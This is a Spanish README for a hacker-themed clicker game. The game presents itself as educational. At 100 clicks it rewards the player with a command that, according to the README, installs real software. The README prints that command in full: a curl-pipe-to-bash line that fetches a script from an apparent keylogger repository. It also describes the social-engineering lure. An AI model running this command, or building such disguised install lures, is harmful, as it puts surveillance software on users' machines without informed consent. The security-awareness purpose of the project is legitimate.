# Clicker Payload Delivery Service 🎯

⚠️ **ADVERTENCIA CRÍTICA - MALWARE REAL** ⚠️

Este repositorio contiene una **demostración real** de cómo el malware puede ser entregado mediante técnicas de **ingeniería social**. El software se presenta como un juego tipo "Clicker" inocuo con temática de hacking, pero **ejecuta comandos reales** que instalan software en tu sistema.

## 🎮 Descripción

**H4CK3R CLICKER** es una aplicación web interactiva que simula un juego de clicker con estética de terminal hacker. Al alcanzar 100 clicks, el usuario recibe un comando para ejecutar en su terminal que **instalará software real**.

### Características:

- ✨ **Interfaz atractiva** con temática de hacking (estilo Matrix/terminal)
- 🎯 **Sistema de progresión** con niveles de acceso (GUEST → USER → ADMIN → ROOT)
- 💻 **Consola interactiva** con mensajes de "hacking" realistas
- 📋 **Comando curl** al completar 100 clicks que ejecuta un script real
- ⚠️ **Advertencias** sobre los riesgos reales
- 🎓 **Contenido educativo** explicando técnicas de ingeniería social

## 🎯 Propósito Educativo

Este proyecto tiene como objetivo **educar** sobre:

1. **Ingeniería Social**: Cómo los atacantes usan interfaces atractivas para engañar usuarios
2. **Vectores de Ataque**: Técnicas de distribución de malware mediante gamificación
3. **Indicadores de Amenaza**: Señales de advertencia que los usuarios suelen ignorar
4. **Concienciación de Seguridad**: Importancia de verificar fuentes antes de ejecutar archivos

## 🚀 Cómo Usar

### Opción 1: Abrir directamente el archivo HTML
```bash
# Simplemente abre index.html en tu navegador
open index.html  # macOS
xdg-open index.html  # Linux
start index.html  # Windows
```

### Opción 2: Servidor HTTP local
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Node.js (con http-server instalado)
npx http-server

# Luego abre http://localhost:8000 en tu navegador
```

## 🎮 Cómo Jugar

1. Haz click en el botón **"EJECUTAR HACK"**
2. Observa cómo aumenta el contador de "HACKS EJECUTADOS"
3. Tu nivel de acceso incrementará progresivamente
4. Al llegar a 100 clicks, se revelará la sección de "recompensa"
5. Se mostrará un comando curl que puedes copiar y ejecutar
6. **⚠️ ADVERTENCIA: El comando ejecuta un script real que instalará software en tu sistema**

### 🥚 Easter Egg
Ingresa el código Konami para obtener acceso ROOT instantáneo:
```
↑ ↑ ↓ ↓ ← → ← → B A
```

## 📁 Estructura del Proyecto

```
.
├── index.html     # Estructura HTML de la aplicación
├── style.css      # Estilos CSS con tema hacker/Matrix
├── script.js      # Lógica del juego y descarga de archivo
└── README.md      # Este archivo
```

## ⚠️ Advertencias Importantes

### Para Usuarios:
- ❌ **NUNCA ejecutes comandos de fuentes no confiables**
- ❌ **Este proyecto ejecuta software real, no es una simulación**
- ❌ **Verifica siempre la legitimidad** de los sitios web
- ❌ **Desconfía de "recompensas" o "premios"** inesperados
- ❌ **No ejecutes comandos curl | bash sin revisar el script primero**
- ✅ **Usa máquinas virtuales** para probar código sospechoso
- ✅ **Mantén actualizado** tu software de seguridad

### Para Desarrolladores:
- Este código es **para demostración de técnicas de ataque reales**
- El comando proporcionado **ejecuta un script real**
- **NO** debe usarse para distribuir malware sin consentimiento
- Usar este concepto para dañar sistemas es **ilegal**

## 🔒 Contenido del Comando

El comando proporcionado es:
```bash
curl https://raw.githubusercontent.com/Jrgil20/KeyloggerEducativoParaLinuxX11/refs/heads/toInstall/scripts/downloadPentestingTool.sh | bash
```

Este comando:
- **Descarga un script real** desde GitHub
- **Lo ejecuta inmediatamente** con permisos de usuario
- **Instala software en tu sistema**
- Es un ejemplo real de cómo se distribuye malware mediante ingeniería social
- **SOLO debe ejecutarse en entornos de prueba aislados**

## 🎓 Conceptos de Seguridad Demostrados

### 1. Social Engineering (Ingeniería Social)
- Uso de gamificación para aumentar engagement
- Creación de falsa sensación de logro
- Llamadas a la acción persuasivas

### 2. Trust Exploitation (Explotación de Confianza)
- Interfaz profesional y pulida
- Terminología técnica convincente
- Progresión que genera compromiso

### 3. Warning Blindness (Ceguera a Advertencias)
- Usuarios ignoran disclaimers en texto pequeño
- Las advertencias se pierden en diseño atractivo
- Exceso de confianza en la "legitimidad" visual

### 4. Delivery Mechanism (Mecanismo de Entrega)
- Uso de comandos curl | bash para ejecución directa
- Requiere interacción del usuario (copiar y pegar comando)
- Bypass de controles de descarga tradicionales
- Ejecución directa sin revisión del código

## 📚 Recursos Educativos

Para aprender más sobre seguridad cibernética:

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Social Engineering Toolkit](https://www.social-engineer.org/)
- [SANS Security Awareness](https://www.sans.org/security-awareness-training/)

## 🤝 Contribuciones

Este es un proyecto de demostración de técnicas reales de ataque. Si deseas contribuir:
- Mejoras en la documentación educativa
- Ejemplos adicionales de vectores de ataque
- Recursos de aprendizaje
- Traducciones

**NO** se aceptan contribuciones que:
- Oculten mejor las advertencias
- Hagan la aplicación más engañosa sin propósito educativo claro
- Distribuyan malware sin el consentimiento explícito del usuario

## 📜 Licencia

Este proyecto demuestra técnicas reales de ingeniería social y distribución de malware con fines **exclusivamente educativos**. El uso de este código para actividades maliciosas sin consentimiento es **ilegal** y está **estrictamente prohibido**.

## 👨‍💻 Autor

Creado como demostración educativa de técnicas de ingeniería social en ciberseguridad.

---

**Recuerda**: El objetivo de este proyecto es **educar y crear conciencia**, no enseñar a crear malware. La mejor defensa contra el malware es un usuario informado y cauteloso. 🛡️
